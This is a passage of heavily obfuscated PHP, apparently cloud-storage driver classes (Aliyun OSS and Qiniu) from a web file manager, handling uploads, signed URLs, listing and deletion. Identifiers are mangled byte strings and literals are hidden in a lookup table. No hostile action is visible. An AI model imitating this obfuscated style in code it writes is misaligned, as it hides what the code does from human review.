‹µë[1321] => @md5_file($’Ğ¼ß«³)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($¢ëÃÓ‹Ü))); $¶Òà‡ü“ = $this->trafficLimit($é ‹µë[1331], $¶Òà‡ü“); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($“¯Î“â), $’Ğ¼ß«³, $¶Òà‡ü“); } catch (OSS\Core\OssException $ºÉèú“İ) { return !1; } return $this->getPathOuter($¢ëÃÓ‹Ü); } public function getHost() { $•Èøì¡¶ =& $_SERVER[Á÷ ­Šë]; $¬ºÑ’ò = explode($•Èøì¡¶[187], parent::getHost()); return $¬ºÑ’ò[0] . $•Èøì¡¶[187] . $this->bucket . $•Èøì¡¶[105] . $¬ºÑ’ò[1]; } public function uploadFormData($–ãÛìÕ, $÷ÁÍÀä = 3600) { $Ôœğöíì =& $_SERVER[Á÷ ­Šë]; if (!($€Ç–ü¾‰ = $this->getHost())) { return !1; } $ŒÊ§˜ö = $÷ÁÍÀä; $îóÈÁÓš = date($Ôœğöíì[1334], time() + $ŒÊ§˜ö); $êŠÉÆ­Ö = new DateTime($îóÈÁÓš); $ŸâË¢ = $êŠÉÆ­Ö->format(DateTime::ISO8601); $¯ÅŞĞÅÖ = strpos($ŸâË¢, $Ôœğöíì[303]); $ŸâË¢ = substr($ŸâË¢, 0, $¯ÅŞĞÅÖ) . $Ôœğöíì[1335]; $Êô×ÂèÕ = 1048576000 * 5; $œ¬‰à÷ = $this->pathFather($–ãÛìÕ); $ãÛ§°Ùñ = array($Ôœğöíì[1234] => $ŸâË¢, $Ôœğöíì[1235] => array(array($Ôœğöíì[1336], 0, $Êô×ÂèÕ), array($Ôœğöíì[1238], $Ôœğöíì[1239], $œ¬‰à÷))); $ÇÒÛó÷ = base64_encode(json_encode($ãÛ§°Ùñ)); $¡á…™ß‚ = base64_encode(hash_hmac($Ôœğöíì[239], $ÇÒÛó÷, $this->secret, !0)); $Òâ™ ê¨ = array($Ôœğöíì[1244] => $ÇÒÛó÷, $Ôœğöíì[1337] => $this->accessKey, $Ôœğöíì[1240] => $Ôœğöíì[1232], $Ôœğöíì[1338] => $¡á…™ß‚, $Ôœğöíì[185] => $€Ç–ü¾‰); $Òâ™ ê¨ = $this->trafficLimit($Ôœğöíì[1331], $Òâ™ ê¨); return $Òâ™ ê¨; } public function multiUploadFormData($ÏéÅÉÑ, $ˆ¾Ñß‰ = 3600) { $éğÚ‹¹Ï =& $_SERVER[Á÷ ­Šë]; if (!($Í¨£õ¹ = $this->getHost())) { return !1; } $Üñ»­ÄÙ = $this->trafficLimit($éğÚ‹¹Ï[1331]); $ğÃò–Ğ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ÏéÅÉÑ), $Üñ»­ÄÙ); return array($éğÚ‹¹Ï[231] => $ğÃò–Ğ, $éğÚ‹¹Ï[185] => $Í¨£õ¹ . $éğÚ‹¹Ï[8] . $this->pathEncode($ÏéÅÉÑ), $éğÚ‹¹Ï[232] => gmdate($éğÚ‹¹Ï[1339]), $éğÚ‹¹Ï[103] => $ÏéÅÉÑ); } public function multiUploadAuthData($ üÊ†¥Í, $àÏµ®“Ë = array()) { $Ş…½ºŠ÷ =& $_SERVER[Á÷ ­Šë]; $×†–Ñ¯ = isset($àÏµ®“Ë[$Ş…½ºŠ÷[232]]) ? $àÏµ®“Ë[$Ş…½ºŠ÷[232]] : gmdate($Ş…½ºŠ÷[1339]); $Îõş×Ô° = isset($àÏµ®“Ë[$Ş…½ºŠ÷[178]]) ? $àÏµ®“Ë[$Ş…½ºŠ÷[178]] : $Ş…½ºŠ÷[33]; $òâÈÒÅ­ = $ üÊ†¥Í; if (isset($àÏµ®“Ë[$Ş…½ºŠ÷[103]])) { $òâÈÒÅ­ = $àÏµ®“Ë[$Ş…½ºŠ÷[103]]; unset($àÏµ®“Ë[$Ş…½ºŠ÷[103]]); } if (isset($àÏµ®“Ë[$Ş…½ºŠ÷[233]])) { $àÏµ®“Ë[$Ş…½ºŠ÷[232]] = $×†–Ñ¯; return $this->listUploadParts($òâÈÒÅ­, $àÏµ®“Ë); } $¶È­°·Õ = array($Ş…½ºŠ÷[234], $Ş…½ºŠ÷[33], $Ş…½ºŠ÷[129], $×†–Ñ¯, "\x78\x2d\x6f\x73\163\x2d\144\x61\164\x65\72{$×†–Ñ¯}", $Ş…½ºŠ÷[8] . $this->bucket . $Ş…½ºŠ÷[8] . $òâÈÒÅ­ . $Îõş×Ô°); if (strpos($Îõş×Ô°, $Ş…½ºŠ÷[235]) === 0) { $¶È­°·Õ[0] = $Ş…½ºŠ÷[236]; if ($ãº¦‡£ó = $this->trafficLimit($Ş…½ºŠ÷[1331])) { $òâÈÒÅ­ = $Ş…½ºŠ÷[1340]; array_splice($¶È­°·Õ, 5, 0, $òâÈÒÅ­ . $Ş…½ºŠ÷[4] . $ãº¦‡£ó[$òâÈÒÅ­]); } } if (isset($àÏµ®“Ë[$Ş…½ºŠ÷[237]]) && $àÏµ®“Ë[$Ş…½ºŠ÷[237]] == $Ş…½ºŠ÷[238]) { $¶È­°·Õ[0] = $Ş…½ºŠ÷[238]; } if (!empty($àÏµ®“Ë[$Ş…½ºŠ÷[1341]])) { $Ã¼™Àö = array_merge(array($¶È­°·Õ[4]), $àÏµ®“Ë[$Ş…½ºŠ÷[1341]]); sort($Ã¼™Àö); $¶È­°·Õ[4] = implode($Ş…½ºŠ÷[62], $Ã¼™Àö); } $è£Ù¯ûå = implode($Ş…½ºŠ÷[62], $¶È­°·Õ); $ŒÁáµç = base64_encode(hash_hmac($Ş…½ºŠ÷[239], $è£Ù¯ûå, $this->secret, !0)); $Ã¨ÚãÎ’ = $Ş…½ºŠ÷[1305] . $this->accessKey . $Ş…½ºŠ÷[4] . $ŒÁáµç; if (strpos($Îõş×Ô°, $Ş…½ºŠ÷[235]) === 0) { $Ã¨ÚãÎ’ = array($Ş…½ºŠ÷[241] => $Ã¨ÚãÎ’, $Ş…½ºŠ÷[232] => $×†–Ñ¯); if ($ãº¦‡£ó) { $Ã¨ÚãÎ’ = array_merge($Ã¨ÚãÎ’, $ãº¦‡£ó); } } return $Ã¨ÚãÎ’; } public function listUploadParts($µÄâíÌÆ, $Ğ˜şûß) { $Š¥ôïŸ =& $_SERVER[Á÷ ­Šë]; $²ÊíßÑµ = parse_url_query($Ğ˜şûß[$Š¥ôïŸ[178]]); $ÑçîèŠ = $this->client->listParts($this->bucket, $this->pathEncode($µÄâíÌÆ), $²ÊíßÑµ[$Š¥ôïŸ[231]]); $›İ§†Îó = $ÑçîèŠ->getListPart(); $ÙŸêãî¥ = array(); foreach ($›İ§†Îó as $„©¢·‚¼) { $ÙŸêãî¥[] = array($Š¥ôïŸ[1325] => $„©¢·‚¼->getPartNumber(), $Š¥ôïŸ[1326] => trim($„©¢·‚¼->getETag(), $Š¥ôïŸ[126])); } unset($Ğ˜şûß[$Š¥ôïŸ[233]], $Ğ˜şûß[$Š¥ôïŸ[237]]); $û£—¶ùı = $this->multiUploadAuthData($µÄâíÌÆ, $Ğ˜şûß); if (empty($û£—¶ùı)) { return !1; } return array($Š¥ôïŸ[241] => $û£—¶ùı, $Š¥ôïŸ[232] => $Ğ˜şûß[$Š¥ôïŸ[232]], $Š¥ôïŸ[243] => $ÙŸêãî¥); } public function download($°ıŸú‘—, $ñÉ¾¼¼÷) { if ($this->isFolder($°ıŸú‘—)) { return !1; } try { $„™éµ¾¹ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ñÉ¾¼¼÷); $„™éµ¾¹ = $this->trafficLimit($_SERVER[Á÷ ­Šë][119], $„™éµ¾¹); $this->client->getObject($this->bucket, $this->pathEncode($°ıŸú‘—), $„™éµ¾¹); } catch (OSS\Core\OssException $ì›Íò¾Ú) { return !1; } return $ñÉ¾¼¼÷; } public function fileSubstr($ÇÈ´¤şÀ, $Ûô£À½‘ = 0, $×Ô¼âÁ¬ = false) { if ($Ûô£À½‘ === -1) { $©˜²ó¢— = array(); } else { if ($×Ô¼âÁ¬ === !1) { $æ°ßğ˜  = $this->size($ÇÈ´¤şÀ); } else { $æ°ßğ˜  = $Ûô£À½‘ + $×Ô¼âÁ¬ - 1; } $©˜²ó¢— = array(OSS\OssClient::OSS_RANGE => "{$Ûô£À½‘}\55{$æ°ßğ˜ }"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ÇÈ´¤şÀ), $©˜²ó¢—); } catch (OSS\Core\OssException $óÅ†Ş») { think_exception($óÅ†Ş»->getMessage()); return !1; } } private function trafficLimit($¯ãòùü¾, $Õù…ÒÉ = array()) { $¦ãÓ»“ =& $_SERVER[Á÷ ­Šë]; if ($¯ãòùü¾ == $¦ãÓ»“[1331] && $this->isUploadServer() || $¯ãòùü¾ == $¦ãÓ»“[119] && $this->isFileOutServer()) { return $Õù…ÒÉ; } $‡ï…ó‚è = floatval($GLOBALS[$¦ãÓ»“[6]][$¦ãÓ»“[98]][$¦ãÓ»“[117]][$¯ãòùü¾]) * 1024 * 1024 * 8; if (!$‡ï…ó‚è) { return $Õù…ÒÉ; } $‡ï…ó‚è = $‡ï…ó‚è < 819200 ? 819200 : ($‡ï…ó‚è > 838860800 ? 838860800 : $‡ï…ó‚è); $Õù…ÒÉ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($‡ï…ó‚è); return $Õù…ÒÉ; } public function link($š¤Ë²ø, $Æ¶‰ÅÑÅ = array()) { $œâÖî =& $_SERVER[Á÷ ­Šë]; if (!$this->exist($š¤Ë²ø) || $this->isFolder($š¤Ë²ø)) { return !1; } try { $Æ¶‰ÅÑÅ = $this->trafficLimit($œâÖî[119], $Æ¶‰ÅÑÅ); $‘ÚÉåç· = $this->client->signUrl($this->bucket, $this->pathEncode($š¤Ë²ø), 3600 * 12, $œâÖî[238], $Æ¶‰ÅÑÅ); return $this->getCdnLink($‘ÚÉåç·); } catch (OSS\Core\OssException $œÔÔÁ§) { return !1; } } public function fileOut($öù˜ëÑ®, $²êšªŞ = false, $´ç”Ôç» = false, $Ÿó×“© = '') { $¦ë†· =& $_SERVER[Á÷ ­Šë]; if ($this->isFileOutServer()) { return $this->fileOutServer($öù˜ëÑ®, $²êšªŞ, $´ç”Ôç», $Ÿó×“©); } if (!$´ç”Ôç») { $´ç”Ôç» = $this->pathThis($öù˜ëÑ®); } $´ç”Ôç» = rawurlencode($´ç”Ôç»); $Ô Çî¨ = get_file_mime(get_path_ext($´ç”Ôç»)); if ($Ô Çî¨ == $¦ë†·[223]) { return parent::fileOut($öù˜ëÑ®, $²êšªŞ, $´ç”Ôç», $Ÿó×“©); } $²êšªŞ = $²êšªŞ ? $¦ë†·[224] : $¦ë†·[225]; $¿ÍôƒŸÕ = array(OSS\OssClient::OSS_SUB_RESOURCE => $¦ë†·[1342] . rawurlencode("{$²êšªŞ}\73\146\x69\x6c\x65\156\141\x6d\x65\75{$´ç”Ôç»}")); $¿ÍôƒŸÕ[OSS\OssClient::OSS_SUB_RESOURCE] .= $¦ë†·[1343] . rawurlencode($Ô Çî¨); $Ñå¨Ÿ– = $this->link($öù˜ëÑ®, $¿ÍôƒŸÕ); $this->fileOutLink($Ñå¨Ÿ–); } public function fileOutServer($è¶âÃ, $Ÿ»óµêô = false, $öì”ßæœ = false, $îì­í­Ñ = '') { parent::fileOut($è¶âÃ, $Ÿ»óµêô, $öì”ßæœ, $îì­í­Ñ); } public function fileOutImage($”æ•ƒ‹¾, $´òÚŸ€Ú = 250) { $½ßÎ… = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Á÷ ­Šë][1344] . $´òÚŸ€Ú); $¯»ÂÆÎä = $this->link($”æ•ƒ‹¾, $½ßÎ…); $this->fileOutLink($¯»ÂÆÎä); } public function fileOutImageServer($ËêÚú¤, $ş›‡¼€Á = 250) { parent::fileOutImage($ËêÚú¤, $ş›‡¼€Á); } public function fileOutLink($İ¶“ƒÓ¡) { $ßÓ¬®·Ì =& $_SERVER[Á÷ ­Šë]; if (!$this->isCdnHost() && substr($İ¶“ƒÓ¡, 0, 7) == $ßÓ¬®·Ì[1247]) { $İ¶“ƒÓ¡ = $ßÓ¬®·Ì[1248] . substr($İ¶“ƒÓ¡, 7); } header($ßÓ¬®·Ì[169] . $İ¶“ƒÓ¡); die; } public function hashMd5($¥ğà°­™, $²Ä³ıí¶ = '') { $¬îéè³Î =& $_SERVER[Á÷ ­Šë]; $ŒÔêîÙ = $this->_objectMeta($¥ğà°­™); if (!$ŒÔêîÙ) { return $¬îéè³Î[33]; } if (!isset($ŒÔêîÙ[$¬îéè³Î[1321]]) && !empty($²Ä³ıí¶)) { $ê§ß©Öı = $this->updateObjMeta($¥ğà°­™, array($¬îéè³Î[1321] => $²Ä³ıí¶)); $ŒÔêîÙ[$¬îéè³Î[1321]] = $ê§ß©Öı ? $²Ä³ıí¶ : $¬îéè³Î[33]; } return isset($ŒÔêîÙ[$¬îéè³Î[1321]]) ? strtolower($ŒÔêîÙ[$¬îéè³Î[1321]]) : $¬îéè³Î[33]; } public function size($…€¬Äª©) { $Ë°Ïë˜… = $this->objectMeta($…€¬Äª©); return $Ë°Ïë˜… ? $Ë°Ïë˜…[$_SERVER[Á÷ ­Šë][88]] : 0; } public function info($îöæ«Š) { if ($this->isFolder($îöæ«Š)) { return $this->folderInfo($îöæ«Š); } else { if ($this->isFile($îöæ«Š)) { return $this->fileInfo($îöæ«Š); } } return !1; } public function exist($˜ãí‘ùÏ) { return $this->isFile($˜ãí‘ùÏ) || $this->isFolder($˜ãí‘ùÏ); } public function isFile($œ¾—ÊŞÎ) { return !$this->isFolder($œ¾—ÊŞÎ) && $this->objectMeta($œ¾—ÊŞÎ); } public function isFolder($Â¶Üğß·) { return $this->cacheMethod($_SERVER[Á÷ ­Šë][209], $Â¶Üğß·); } protected function objectMeta($Ï’ôš…ó) { return $this->cacheMethod($_SERVER[Á÷ ­Šë][210], $Ï’ôš…ó); } protected function _objectMeta($å™Û æ›) { $»çœ¨›İ =& $_SERVER[Á÷ ­Šë]; try { $€ıÎã¿´ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($å™Û æ›)); } catch (OSS\Core\OssException $¦øëµÈá) { $€ıÎã¿´ = !1; } if ($€ıÎã¿´) { $€ıÎã¿´[$»çœ¨›İ[88]] = intval($€ıÎã¿´[$»çœ¨›İ[1319]]); } return $€ıÎã¿´; } protected function _isFolder($Ñ¹´á×•) { $õÌİß»‰ =& $_SERVER[Á÷ ­Šë]; if ($Ñ¹´á×• == $õÌİß»‰[33] || $Ñ¹´á×• == $õÌİß»‰[8]) { return !0; } $å¯ŞàØß = array($õÌİß»‰[1315] => $õÌİß»‰[8], $õÌİß»‰[1316] => rtrim($Ñ¹´á×•, $õÌİß»‰[8]) . $õÌİß»‰[8], $õÌİß»‰[1317] => 1, $õÌİß»‰[1318] => $õÌİß»‰[33]); $äáéıœ† = $this->client->listObjects($this->bucket, $å¯ŞàØß); if ($äáéıœ†->getObjectList() || $äáéıœ†->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($ª´ÚÈëÒ) { parent::__construct(); require_once SDK_DIR . $_SERVER[Á÷ ­Šë][1345]; $this->_init($ª´ÚÈëÒ); } public function _init($ú“áÚÚÄ) { $ææà åµ =& $_SERVER[Á÷ ­Šë]; foreach ($ú“áÚÚÄ as $éº§ÆÉ÷ => $²°º”¶š) { if (isset($this->{$éº§ÆÉ÷})) { $this->{$éº§ÆÉ÷} = $²°º”¶š; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ææà åµ[1346] . LNG($ææà åµ[1306])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($²¯Æ©­ä, $§ÄŠª‡Ê = '', $ÌãÒø° = REPEAT_RENAME) { if ($this->setContent($²¯Æ©­ä, $§ÄŠª‡Ê)) { return $this->getPathOuter($²¯Æ©­ä); } return !1; } public function mkdir($Â«‡ğï³, $Ó‹Í¾ = REPEAT_SKIP) { $êğ†äıÈ =& $_SERVER[Á÷ ­Šë]; $µÜµŸ = trim($Â«‡ğï³, $êğ†äıÈ[8]); if ($this->_isFolder($µÜµŸ)) { return $this->getPathOuter($µÜµŸ); } $Â«‡ğï³ = $µÜµŸ . $êğ†äıÈ[8]; $ë¤ü–ÈË = get_path_this($µÜµŸ); $‚ïÆÔğ² = $Â«‡ğï³ . $ë¤ü–ÈË; if (!$this->mkfile($‚ïÆÔğ²)) { return !1; } if (!$this->moveFile($‚ïÆÔğ², $Â«‡ğï³)) { $this->delFile($‚ïÆÔğ²); return !1; } return $this->getPathOuter($µÜµŸ); } public function copyFile($±ùÜÂ, $ì¨¦¶Úå) { $œ¹ƒòšİ = $this->bucketManager->copy($this->bucket, $±ùÜÂ, $this->bucket, $ì¨¦¶Úå, !0); return $œ¹ƒòšİ ? !1 : $this->getPathOuter($ì¨¦¶Úå); } public function moveFile($¥¿èÜöç, $©Ğã‰Ç”) { $½ÃÛ¾Û” = $this->bucketManager->move($this->bucket, $¥¿èÜöç, $this->bucket, $©Ğã‰Ç”, !0); return $½ÃÛ¾Û” ? !1 : $this->getPathOuter($©Ğã‰Ç”); } public function delFile($ÀÁª·¢Ô) { if (!$this->exist($ÀÁª·¢Ô)) { return !0; } $–ÆÔšå„ = $this->bucketManager->delete($this->bucket, $ÀÁª·¢Ô); return $–ÆÔšå„ ? !1 : !0; } public function delFolder($Æµ¦ÈŠã) { $şËğÚÊë =& $_SERVER[Á÷ ­Šë]; if (!$this->exist($Æµ¦ÈŠã)) { return !0; } $this->listItemCache = !1; $É´ “ÂŠ = $this->fileList($Æµ¦ÈŠã); $this->listItemCache = !0; $õü¹Ä…« = trim($Æµ¦ÈŠã, $şËğÚÊë[8]) . $şËğÚÊë[8]; if (!empty($Æµ¦ÈŠã) && $Æµ¦ÈŠã !== $şËğÚÊë[201] && !in_array($õü¹Ä…«, $É´ “ÂŠ[$şËğÚÊë[85]])) { $É´ “ÂŠ[$şËğÚÊë[85]][] = $õü¹Ä…«; } $ãõ³Ò– = $this->delByBatch($É´ “ÂŠ[$şËğÚÊë[84]]); if (!$ãõ³Ò–) { return !1; } $ãõ³Ò– = $this->delByBatch($É´ “ÂŠ[$şËğÚÊë[85]]); if (!$ãõ³Ò–) { return !1; } return $this->delFile($õü¹Ä…«); } private function delByBatch($®ï§–´Ï) { foreach (array_chunk($®ï§–´Ï, 1000) as $Ç¸ŠÅÍ÷) { $”˜Ç•šÀ = $this->bucketManager->buildBatchDelete($this->bucket, $Ç¸ŠÅÍ÷); list($­ºÖ´ „, $—öÙ¨Ø) = $this->bucketManager->batch($”˜Ç•šÀ); if ($—öÙ¨Ø) { return !1; } } return !0; } public function rename($¬‹Ğ¯÷ó, $ÓôÇ×ĞÏ) { return $this->renameObject($¬‹Ğ¯÷ó, $ÓôÇ×ĞÏ); } public function fileInfo($¼äÙ»’, $©ÒûÔ‘ú = false, $«Ëşğ  = array()) { $äÑ…÷ë– =& $_SERVER[Á÷ ­Šë]; $¾·èäÂì = array($äÑ…÷ë–[28] => $this->pathThis($¼äÙ»’), $äÑ…÷ë–[86] => $this->getPathOuter($äÑ…÷ë–[8] . $¼äÙ»’), $äÑ…÷ë–[29] => $äÑ…÷ë–[203], $äÑ…÷ë–[88] => isset($«Ëşğ [$äÑ…÷ë–[1347]]) ? $«Ëşğ [$äÑ…÷ë–[1347]] : 0, $äÑ…÷ë–[178] => $this->ext($¼äÙ»’)); if ($©ÒûÔ‘ú) { return $¾·èäÂì; } $¾·èäÂì[$äÑ…÷ë–[204]] = $¾·èäÂì[$äÑ…÷ë–[94]] = 0; $¾·èäÂì[$äÑ…÷ë–[205]] = $¾·èäÂì[$äÑ…÷ë–[206]] = !0; if (empty($«Ëşğ )) { $«Ëşğ  = $this->objectMeta($¼äÙ»’); if (!$«Ëşğ ) { return $¾·èäÂì; } } if (isset($«Ëşğ [$äÑ…÷ë–[1348]])) { $¾·èäÂì[$äÑ…÷ë–[94]] = substr($«Ëşğ [$äÑ…÷ë–[1348]] . $äÑ…÷ë–[33], 0, 10); } if (isset($«Ëşğ [$äÑ…÷ë–[1347]])) { $¾·èäÂì[$äÑ…÷ë–[88]] = $«Ëşğ [$äÑ…÷ë–[1347]]; } return $¾·èäÂì; } public function folderInfo($‚Õ¨»ø, $öÍ¾ ¿û = false) { $•µ®úÑ =& $_SERVER[Á÷ ­Šë]; $÷©‹®ò = array($•µ®úÑ[28] => $this->pathThis($‚Õ¨»ø), $•µ®úÑ[86] => $this->getPathOuter($•µ®úÑ[8] . $‚Õ¨»ø), $•µ®úÑ[29] => $•µ®úÑ[87]); if ($öÍ¾ ¿û) { return $÷©‹®ò; } $÷©‹®ò[$•µ®úÑ[204]] = $÷©‹®ò[$•µ®úÑ[94]] = 0; $÷©‹®ò[$•µ®úÑ[205]] = $÷©‹®ò[$•µ®úÑ[206]] = !0; $‚Õ¨»ø = rtrim($‚Õ¨»ø, $•µ®úÑ[8]) . $•µ®úÑ[8]; $ÔÒŞÂøé = $this->objectMeta($‚Õ¨»ø); if (isset($ÔÒŞÂøé[$•µ®úÑ[1348]])) { $÷©‹®ò[$•µ®úÑ[94]] = substr($ÔÒŞÂøé[$•µ®úÑ[1348]] . $•µ®úÑ[33], 0, 10); } return $÷©‹®ò; } public function listPath($Çú¾Èíˆ, $ğŸ“Ğâ‘ = false) { $üÍ²Æ”ä =& $_SERVER[Á÷ ­Šë]; $ôÎêşƒç = $this->fileList($Çú¾Èíˆ, $üÍ²Æ”ä[8], !0); foreach ($ôÎêşƒç[$üÍ²Æ”ä[85]] as $¦¯Ã³½ => $±¼Ø«Û) { $ôÎêşƒç[$üÍ²Æ”ä[85]][$¦¯Ã³½] = $this->folderInfo($±¼Ø«Û, $ğŸ“Ğâ‘); } foreach ($ôÎêşƒç[$üÍ²Æ”ä[84]] as $¦¯Ã³½ => $±¼Ø«Û) { $ôÎêşƒç[$üÍ²Æ”ä[84]][$¦¯Ã³½] = $this->fileInfo($±¼Ø«Û[$üÍ²Æ”ä[103]], $ğŸ“Ğâ‘, $±¼Ø«Û); } return $ôÎêşƒç; } public function has($ú€êƒ›, $€¼ç˜—© = false, $€“³°‰ = true) { $²ÃÓ„ÛÄ =& $_SERVER[Á÷ ­Šë]; $ú€êƒ› = trim($ú€êƒ›, $²ÃÓ„ÛÄ[8]); $Óúş›† = empty($ú€êƒ›) && $ú€êƒ› !== $²ÃÓ„ÛÄ[201] ? $²ÃÓ„ÛÄ[33] : $ú€êƒ› . $²ÃÓ„ÛÄ[8]; $‚“Å¸‘ = $²ÃÓ„ÛÄ[33]; $ªËÁé» = 500; $ÊõßÕÊ = $²ÃÓ„ÛÄ[8]; $ˆÃ°ßÑÈ = $êËØğş = 0; while (!0) { check_abort(); list($Ç „ ö©, $Š´ÒÍ†›) = $this->bucketManager->listFiles($this->bucket, $Óúş›†, $‚“Å¸‘, $ªËÁé», $ÊõßÕÊ); if ($Š´ÒÍ†›) { break; } $‚“Å¸‘ = array_key_exists($²ÃÓ„ÛÄ[1318], $Ç „ ö©) ? $‚“Å¸‘ = $Ç „ ö©[$²ÃÓ„ÛÄ[1349]] : $²ÃÓ„ÛÄ[33]; if ($€¼ç˜—©) { if (!empty($Ç „ ö©[$²ÃÓ„ÛÄ[1350]])) { $ˆÃ°ßÑÈ += count($Ç „ ö©[$²ÃÓ„ÛÄ[1350]]); } if (!empty($Ç „ ö©[$²ÃÓ„ÛÄ[1351]])) { $êËØğş += count($Ç „ ö©[$²ÃÓ„ÛÄ[1351]]); } if ($‚“Å¸‘ === $²ÃÓ„ÛÄ[33]) { break; } continue; } if ($€“³°‰) { if (!empty($Ç „ ö©[$²ÃÓ„ÛÄ[1350]])) { return !0; } } else { if (!empty($Ç „ ö©[$²ÃÓ„ÛÄ[1351]])) { return !0; } } if ($‚“Å¸‘ === $²ÃÓ„ÛÄ[33]) { break; } } if ($€¼ç˜—©) { return array($²ÃÓ„ÛÄ[213] => $ˆÃ°ßÑÈ, $²ÃÓ„ÛÄ[214] => $êËØğş); } return !1; } public function listAll($áêîü) { $ßÀÓ©½¢ =& $_SERVER[Á÷ ­Šë]; $å¤”’ë = $this->fileList($áêîü, $ßÀÓ©½¢[33], !0); $¦şÆ§¬ = array(); foreach ($å¤”’ë[$ßÀÓ©½¢[84]] as $ş¡ôã‘Î) { $¦şÆ§¬[$ş¡ôã‘Î[$ßÀÓ©½¢[103]]] = $ş¡ôã‘Î[$ßÀÓ©½¢[88]]; } foreach ($å¤”’ë[$ßÀÓ©½¢[85]] as $ş¡ôã‘Î) { if (is_string($ş¡ôã‘Î)) { $¦şÆ§¬[$ş¡ôã‘Î] = 0; } } return $this->listAllFiles($áêîü, array_keys($¦şÆ§¬), $¦şÆ§¬); } private function fileList($—¨¨³ë¶, $Ô³¹²òô = '', $Ş ¼üì– = 0) { $şÅ·¶Ê´ =& $_SERVER[Á÷ ­Šë]; $—¨¨³ë¶ = trim($—¨¨³ë¶, $şÅ·¶Ê´[8]); $±–ÊøÉ = empty($—¨¨³ë¶) && $—¨¨³ë¶ !== $şÅ·¶Ê´[201] ? $şÅ·¶Ê´[33] : $—¨¨³ë¶ . $şÅ·¶Ê´[8]; $ƒ™şœğ = $şÅ·¶Ê´[33]; $½©¨˜Ÿá = 1000; $ë³ü«¡÷ = $this->listItemCache === !1 ? !1 : !0; $ÇÙ‹ğ’‡ = $½á©©…ı = array(); while (!0) { check_abort(); list($©¶ğ‰ŠØ, $Üö‘Ş÷ñ) = $this->bucketManager->listFiles($this->bucket, $±–ÊøÉ, $ƒ™şœğ, $½©¨˜Ÿá, $Ô³¹²òô); if ($Üö‘Ş÷ñ) { break; } $ƒ™şœğ = array_key_exists($şÅ·¶Ê´[1318], $©¶ğ‰ŠØ) ? $ƒ™şœğ = $©¶ğ‰ŠØ[$şÅ·¶Ê´[1349]] : $şÅ·¶Ê´[33]; $óóáŞ£Ê = isset($©¶ğ‰ŠØ[$şÅ·¶Ê´[1350]]) ? $©¶ğ‰ŠØ[$şÅ·¶Ê´[1350]] : array(); $å¸Ÿ¡«Ü = isset($©¶ğ‰ŠØ[$şÅ·¶Ê´[1351]]) ? $©¶ğ‰ŠØ[$şÅ·¶Ê´[1351]] : array(); foreach ($óóáŞ£Ê as $ö‡Ğ–¸Œ) { if ($ö‡Ğ–¸Œ[$şÅ·¶Ê´[103]] == $±–ÊøÉ) { continue; } $âé’»¶ = $ö‡Ğ–¸Œ[$şÅ·¶Ê´[103]]; $º¥Ş¿Œæ = $ö‡Ğ–¸Œ[$şÅ·¶Ê´[1347]]; $ö‡Ğ–¸Œ[$şÅ·¶Ê´[88]] = $º¥Ş¿Œæ; $Éô¹ÂŞÃ = $º¥Ş¿Œæ == 0 && substr($âé’»¶, strlen($âé’»¶) - 1, 1) == $şÅ·¶Ê´[8] ? !0 : !1; if ($ë³ü«¡÷) { $this->cacheMethod($şÅ·¶Ê´[209], $âé’»¶, $Éô¹ÂŞÃ); $this->cacheMethod($şÅ·¶Ê´[210], $âé’»¶, $ö‡Ğ–¸Œ); } if ($Éô¹ÂŞÃ) { $ÇÙ‹ğ’‡[] = $âé’»¶; continue; } $½á©©…ı[] = $Ş ¼üì– ? $ö‡Ğ–¸Œ : $âé’»¶; } foreach ($å¸Ÿ¡«Ü as $âé’»¶) { if ($âé’»¶ == $±–ÊøÉ) { continue; } $ÇÙ‹ğ’‡[] = $âé’»¶; if ($ë³ü«¡÷) { $this->cacheMethod($şÅ·¶Ê´[209], $âé’»¶, !0); } } if ($ƒ™şœğ === $şÅ·¶Ê´[33]) { break; } } if ($ë³ü«¡÷) { $this->cacheMethod($şÅ·¶Ê´[209], $—¨¨³ë¶, !0); } return array($şÅ·¶Ê´[85] => $ÇÙ‹ğ’‡, $şÅ·¶Ê´[84] => $½á©©…ı); } public function canRead($Ùğò“Ø†) { return $this->exist($Ùğò“Ø†) ? !0 : !1; } public function canWrite($ÔÕ˜°â) { return $this->exist($ÔÕ˜°â) ? !0 : !1; } public function getContent($×˜ ¾Ÿˆ) { return $this->fileSubstr($×˜ ¾Ÿˆ, 0, -1); } public function setContent($ğí©³Ã‚, $Ç½å• = '') { $‹ø»‡„ = $this->tempFile($this->pathThis($ğí©³Ã‚)); file_put_contents($‹ø»‡„, $Ç½å•); if ($this->upload($ğí©³Ã‚, $‹ø»‡„)) { $this->tempFileRemve($‹ø»‡„); return !0; } return !1; } public function refreshUrls($•ˆ­ò‡ ) { $‘µÂé¢ =& $_SERVER[Á÷ ­Šë]; $Š¸æÚ¼— = array(); if (is_array($•ˆ­ò‡ )) { foreach ($•ˆ­ò‡  as $§”ÉÙŒñ) { $Š¸æÚ¼—[] = $this->link($§”ÉÙŒñ); } } else { $Š¸æÚ¼—[] = $this->link($•ˆ­ò‡ ); } $‚Èóçª– = new Qiniu\Cdn\CdnManager($this->auth); list($Å‘èüùå, $³ª‡™Ù) = $‚Èóçª–->refreshUrls($Š¸æÚ¼—); if ($³ª‡™Ù) { return !1; } return $Å‘èüùå[$‘µÂé¢[1109]] == $‘µÂé¢[755] ? !0 : !1; } public function fileSubstr($¿¨¿ûè, $™ØÌ¯ŞŠ, $êç€…¾“) { $£Ê—Â¿ =& 